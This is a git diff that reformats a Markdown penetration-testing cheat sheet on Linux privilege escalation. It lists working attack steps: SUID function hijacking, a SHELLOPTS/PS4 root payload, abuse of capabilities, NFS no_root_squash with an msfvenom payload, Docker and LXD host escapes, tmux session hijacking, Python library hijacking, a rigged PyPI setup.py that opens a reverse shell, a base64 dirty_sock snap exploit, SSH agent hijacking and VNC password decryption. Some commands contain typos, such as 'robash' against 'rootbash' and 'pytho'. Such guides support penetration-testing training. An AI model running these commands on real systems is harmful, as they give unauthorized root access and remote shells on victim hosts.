+    function /usr/sbin/serviceCalled { /bin/bash -p; }
+    export –f /usr/sbin/serviceCalled
+    ```
+7.  Execute the SUID file for a root shell:
 
-   ```text
-   ltrace /usr/local/bin/binary_name 2>&1 
-   ```
-
-5. Verify the version of Bash is lower than 4.2-048:
-
-   ```text
-   $ bash --version
-   GNU bash, version 4.1.5(1)-release (x86_64-pc-linux-gnu)
-   ```
-
-6. Create a Bash function with the name “/usr/sbin/serviceCalled” \(change this to the actual name of the program being called\) and export the function:
-
-   ```text
-   function /usr/sbin/serviceCalled { /bin/bash -p; }
-   export –f /usr/sbin/serviceCalled
-   ```
-
-7. Execute the SUID file for a root shell:
-
-   ```text
-   $ /usr/local/bin/binary_name
-   root@victim:~# id
-   uid=0(root) gid=0(root) groups=0(root) ...
-   ```
+    ```
+    $ /usr/local/bin/binary_name
+    root@victim:~# id
+    uid=0(root) gid=0(root) groups=0(root) ...
+    ```
 
 ### SHELLOPTS
 
@@ -1311,43 +1276,38 @@ It is possible to define user functions with an absolute pathname.
 
 #### SHELLOPTS Privilege Escalation
 
-1. Enumerate SUID/SGID files on the target:
+1.  Enumerate SUID/SGID files on the target:
 
-   ```text
-   find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
-   ```
+    ```
+    find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
+    ```
+2.  Enumerate strings on the SUID file:
 
-2. Enumerate strings on the SUID file:
+    ```
+    strings /usr/local/bin/binary_name
+    ```
+3.  The binary may be trying to include a file, we can verify this with strace:
 
-   ```text
-   strings /usr/local/bin/binary_name
-   ```
+    ```
+    strace -v -f -e execve /usr/local/bin/binary_name 2>&1
+    ```
+4.  Alternatively, we can also verify with ltrace:
 
-3. The binary may be trying to include a file, we can verify this with strace:
+    ```
+    ltrace /usr/local/bin/binary_name 2>&1
+    ```
+5.  Run the SUID file with bash debugging enabled and the PS4 variable assigned to our payload:
 
-   ```text
-   strace -v -f -e execve /usr/local/bin/binary_name 2>&1
-   ```
+    ```
+    env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/robash; chown root /tmp/rootbash; chmod +s /tmp/robash)' /usr/local/bin/binary_name
+    ```
+6.  Run the robash with the -p option to get a root shell:
 
-4. Alternatively, we can also verify with ltrace:
-
-   ```text
-   ltrace /usr/local/bin/binary_name 2>&1
-   ```
-
-5. Run the SUID file with bash debugging enabled and the PS4 variable assigned to our payload:
-
-   ```text
-   env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/robash; chown root /tmp/rootbash; chmod +s /tmp/robash)' /usr/local/bin/binary_name
-   ```
-
-6. Run the robash with the -p option to get a root shell:
-
-   ```text
-   /tmp/robash -p
-   rootbash-4.1# id
-   uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) ...
-   ```
+    ```
+    /tmp/robash -p
+    rootbash-4.1# id
+    uid=1000(user) gid=1000(user) euid=0(root) egid=0(root) ...
+    ```
 
 ## Capabilities
 
@@ -1363,33 +1323,33 @@ getcap -r / 2>/dev/null
 
 Example with python3:
 
-```text
+```
 /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
 ```
 
-```text
+```
 username@victim:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
 ## NFS
 
-The NFS \(Network File System\) file system is a widely used distributed file system. The /etc/exports file is used to set up NFS shares. Remote users can access, create, and modify files, as well as mount shares. Even if they don't exist on the NFS server, new files inherit the remote user's and group's ids \(as owner and group, respectively\).
+The NFS (Network File System) file system is a widely used distributed file system. The /etc/exports file is used to set up NFS shares. Remote users can access, create, and modify files, as well as mount shares. Even if they don't exist on the NFS server, new files inherit the remote user's and group's ids (as owner and group, respectively).
 
 Show the export list for the NFS server:
 
-```text
+```
 showmount -e <target>
 ```
 
 Nmap NSE script:
 
-```text
+```
 nmap –sV –script=nfs-showmount <target>
 ```
 
 Mount an NFS share:
 
-```text
+```
 mount -o rw,vers=2 <target>:<share> <local_directory>
 ```
 
@@ -1403,48 +1363,43 @@ Root squashing is disabled via the no\_root\_squash NFS configuration option. A 
 
 #### no\_root\_squash Privilege Escalation
 
-1. With the no\_root\_squash option, check the contents of /etc/exports for shares:
+1.  With the no\_root\_squash option, check the contents of /etc/exports for shares:
 
-   ```text
-   cat /etc/exports
-   ...
-   /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
-   ```
+    ```
+    cat /etc/exports
+    ...
+    /tmp *(rw,sync,insecure,no_root_squash,no_subtree_check)
+    ```
+2.  Ensure that the NFS share is accessible from a remote location:
 
-2. Ensure that the NFS share is accessible from a remote location:
+    ```
+    $ showmount -e 192.168.1.10
+    Exports list on 192.168.1.10:
+    /tmp
+    ```
+3.  Mount the /tmp NFS share on your local system by creating a mount point:
 
-   ```text
-   $ showmount -e 192.168.1.10
-   Exports list on 192.168.1.10:
-   /tmp
-   ```
+    ```
+    mkdir /tmp/nfs
+    mount -o rw,vers=2 192.168.10.10:/tmp /tmp/nfs
+    ```
+4.  Create a payload and store it to the mounted share as the root user on your localhost (e.g Kali or Parrot):
 
-3. Mount the /tmp NFS share on your local system by creating a mount point:
+    ```
+    msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
+    ```
+5.  Set a SUID bit on the file and make it executable by anyone:
 
-   ```text
-   mkdir /tmp/nfs
-   mount -o rw,vers=2 192.168.10.10:/tmp /tmp/nfs
-   ```
+    ```
+    chmod +xs /tmp/nfs/shell.elf
+    ```
+6.  To acquire a root shell on the target machine, run the following command:
 
-4. Create a payload and store it to the mounted share as the root user on your localhost \(e.g Kali or Parrot\):
-
-   ```text
-   msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
-   ```
-
-5. Set a SUID bit on the file and make it executable by anyone:
-
-   ```text
-   chmod +xs /tmp/nfs/shell.elf
-   ```
-
-6. To acquire a root shell on the target machine, run the following command:
-
-   ```text
-   $ /tmp/shell.elf
-   bash-4.1# id
-   uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
-   ```
+    ```
+    $ /tmp/shell.elf
+    bash-4.1# id
+    uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
+    ```
 
 ## Container
 
@@ -1452,28 +1407,28 @@ Root squashing is disabled via the no\_root\_squash NFS configuration option. A 
 
 Enumerate the docker images:
 
-```text
+```
 docker ps
 ```
 
 We can use an existing image to create a container and mount the root file system in the container:
 
-```text
+```
 docker run --rm -it -v /:/mnt username bash
 cd /mnt/root/
 ```
 
 Escalate privileges in the container:
 
-```text
+```
 cd /mnt/bin
 chmod 4755 bash
 exit
 ```
 
-Escalate privileges in the host \(not container\):
+Escalate privileges in the host (not container):
 
-```text
+```
 bash -p
 whoami
 
@@ -1481,7 +1436,7 @@ whoami
 root
 ```
 
-###  LXC/LXD
+### &#x20;LXC/LXD
 
 #### LXD Abuse
 
@@ -1493,7 +1448,7 @@ groups
 lxd
 ```
 
-The lxd \(Linux Daemon\) is a system container manager, that controls lxc \(Linux Container\). Linux Container \(LXC\) is a virtualization technology that runs isolated containers using a single Linux kernel. It is possible for the user ash to create a privileged container and then use it to mount the host filesystem. To achieve this, we can download an Alpine image, and then upload it to the remote machine. Let's download and build the image locally. The image can be found here.
+The lxd (Linux Daemon) is a system container manager, that controls lxc (Linux Container). Linux Container (LXC) is a virtualization technology that runs isolated containers using a single Linux kernel. It is possible for the user ash to create a privileged container and then use it to mount the host filesystem. To achieve this, we can download an Alpine image, and then upload it to the remote machine. Let's download and build the image locally. The image can be found here.
 
 ```bash
 git clone https://github.com/saghul/lxd-alpine-builder.git
@@ -1548,14 +1503,14 @@ A root process may be tied to a port listening only on localhost. If an attack c
 
 If there's a session running as root, then we may be able to escalate our privileges:
 
-```text
+```
 hype@Valentine:~$ ps -ef | grep tmux
 root       1022      1  0 Jul25 ?        00:00:54 /usr/bin/tmux -S /.devs/dev_sess
 ```
 
 Connect to the session:
 
-```text
+```
 tmux -S /.devs/dev_sess
 ```
 
@@ -1565,21 +1520,21 @@ tmux -S /.devs/dev_sess
 
 We are going to see an example with python since it is an error that already comes by default and is the following:
 
-![](../.gitbook/assets/image%20%2829%29.png)
+![](<../.gitbook/assets/image (29).png>)
 
-If we import the **sys** library and make a print of the path we see that in order of priorities the current directory is found first, so we can take advantage of that so that even if we do not have permissions in a  __python script that you have created if we can import a library which we inject malicious code.
+If we import the **sys **library and make a print of the path we see that in order of priorities the current directory is found first, so we can take advantage of that so that even if we do not have permissions in a _ _python script that you have created if we can import a library which we inject malicious code.
 
-Suppose we have the file  **example.py**  in which the following exists:
+Suppose we have the file ** example.py ** in which the following exists:
 
-`import hashlib` 
+`import hashlib`&#x20;
 
 If we do a locate of hashlib we see that it is in the following path:
 
-`/usr/lib/python2.7/hashlib.py` 
+`/usr/lib/python2.7/hashlib.py`&#x20;
 
 And as we see in the first image, that route is in the second position. There may be several cases:
 
-* That the _hashlib_ is not in the second position, but that we have writing capacity in the path /usr/lib/python2.7 '' which should not have it. Well, thanks to that, we would now be doing a library hijacking \(hashlib.py\), there we could define the instructions we want and execute in the system and therefore, we would alter the flow of a program that imports this library because now it would take ours.
+* That the _hashlib_ is not in the second position, but that we have writing capacity in the path /usr/lib/python2.7 '' which should not have it. Well, thanks to that, we would now be doing a library hijacking (hashlib.py), there we could define the instructions we want and execute in the system and therefore, we would alter the flow of a program that imports this library because now it would take ours.
 
 Let's see it with an example:
 
@@ -1593,9 +1548,9 @@ md5=hashlib.md5(word).hexdigest()
 print(md5)
 ```
 
-We have the file  **example.py**  that it imports from the hashlib library. As we have seen above, the  **PATH**  pulls the current directory from the job. It is the case that _we do not have write permissions_ on the file  _example.py_  but **we do** from the current working directory.
+We have the file ** example.py ** that it imports from the hashlib library. As we have seen above, the ** PATH ** pulls the current directory from the job. It is the case that_ we do not have write permissions _on the file _ example.py _ but **we do **from the current working directory.
 
-We can create a file called _hashlib.py_  with the following content:
+We can create a file called _hashlib.py _ with the following content:
 
 ```python
 import os
@@ -1604,7 +1559,7 @@ os.setuid(0)
 os.system(“/bin/bash”)
 ```
 
-Running this script should result in a privilege escalation since we're running a module that sets our UID bit to 0 \(root\) and spawns a bash shell:
+Running this script should result in a privilege escalation since we're running a module that sets our UID bit to 0 (root) and spawns a bash shell:
 
 ```bash
 python example.py
@@ -1614,9 +1569,9 @@ Thanks to [@sh0x](https://twitter.com/T0N1sm) for giving me some notes.
 
 ### PyPi
 
-If the service pypi has an external connection we can follow the steps below in our host \(kali\):
+If the service pypi has an external connection we can follow the steps below in our host (kali):
 
-```text
+```
 mkdir pypi
 cd !$
 mkdir pwned
@@ -1625,7 +1580,7 @@ touch __init__.py
 touch setup.py
 ```
 
-The file **\_\_init\_\_**.py will be empty and the code of the **setup.py** is the following:
+The file** \_\_init\_\_**.py will be empty and the code of the **setup.py** is the following:
 
 ```python
 import setuptools
@@ -1655,7 +1610,7 @@ setuptools.setup(
 )
 ```
 
-The idea here is that when the pypi server **executes** the **setup.py**, we want it to initiate a **reverse shell**.
+The idea here is that when the pypi server **executes **the **setup.py**, we want it to initiate a **reverse shell**.
 
 We configure our host to be able to send the package to the victim repository:
 
@@ -1680,7 +1635,7 @@ Now we can send it to the target machine.
 
 We set a listener on port 443:
 
-```text
+```
 nc -nlvp 443
 ```
 
@@ -1692,21 +1647,21 @@ python3 setup.py sdist upload -r remote
 
 Remember that we set a listener on port 443 and we should get a reverse shell as soon as the server executes the file **setup.py**:
 
-```text
+```
 nc -nlvp 443
 ```
 
 After we receive a reverse shell, see the new user:
 
-```text
+```
 whoami
 ```
 
 ### Snap
 
-Search for snap hook exploit .snap file and we can find the following link [Linux Privilege Escalation via snapd \(dirty\_sock exploit\)](https://initblog.com/2019/dirty-sock/). 
+Search for snap hook exploit .snap file and we can find the following link [Linux Privilege Escalation via snapd (dirty\_sock exploit)](https://initblog.com/2019/dirty-sock/).&#x20;
 
-```text
+```
 echo "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD/
 /////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJh
 ZGQgZGlydHlfc29jayAtbSAtcCAnJDYkc1daY1cxdDI1cGZVZEJ1WCRqV2pFWlFGMnpGU2Z5R3k5
@@ -1727,7 +1682,7 @@ AFwAAAAAAAAAwAAAAAAAAACgAAAAAAAAAOAAAAAAAAAAPgMAAAAAAAAEgAAAAACAAw" | xargs | tr
 
 Copy the output and recreate the package:
 
-```text
+```
 cd /tmp
 pytho -c 'print "aHNxcwcAAAAQIVZcAAACAAAAAAAEABEA0AIBAAQAAADgAAAAAAAAAI4DAAAAAAAAhgMAAAAAAAD
 //////////xICAAAAAAAAsAIAAAAAAAA+AwAAAAAAAHgDAAAAAAAAIyEvYmluL2Jhc2gKCnVzZXJhZGQgZGlydHlfc29
@@ -1758,31 +1713,31 @@ root
 
 We can find git repositories with:
 
-```text
+```
 find \-type f 2>/dev/null | grep ".git"
 ```
 
 Sometimes, you will be able to see folders that contain a `.git` folder in them. That means that the folder is a git repository. **GIT** saves all the history of defiles changes, as an attacker, we can enumerate and see if developers have made mistakes.
 
-```text
+```
 git log
 ```
 
 Sometimes some logs may be hidden, for this we can use reflog:
 
-```text
+```
 git reflog
 ```
 
 We can use the parameter `-p` to look at the differences made in a commit:
 
-```text
+```
 git log -p <ID>
 ```
 
 Alternatively, we can use diff:
 
-```text
+```
 git diff <ID>
 ```
 
@@ -1832,7 +1787,7 @@ while true; do a=$(ls /tmp/ssh-*/agent.*); export SSH_AUTH_SOCK=$a; ssh root@172
 
 An easy privilege escalation vector is:
 
-```text
+```
 gosu root bash
 ```
 
@@ -1840,15 +1795,13 @@ gosu root bash
 
 VNC Passwords in a file are stored obfuscated, but they can be broken. There’s a bunch of scripts out there to return the plain text. We can use [this one](https://github.com/trinitronx/vncpasswd.py), running the python and using `-d` for decrypt, and `-f secret` to point it at our file.
 
-```text
+```
 root@kali:~/hackthebox/poison-10.10.10.84# python /opt/vncpasswd.py/vncpasswd.py -d -f secret
 Cannot read from Windows Registry on a Linux system
 Cannot write to Windows Registry on a Linux system
 Decrypted Bin Pass= 'VNCP@$$!'
 Decrypted Hex Pass= '564e435040242421'
 ```
-
-
 
 
 
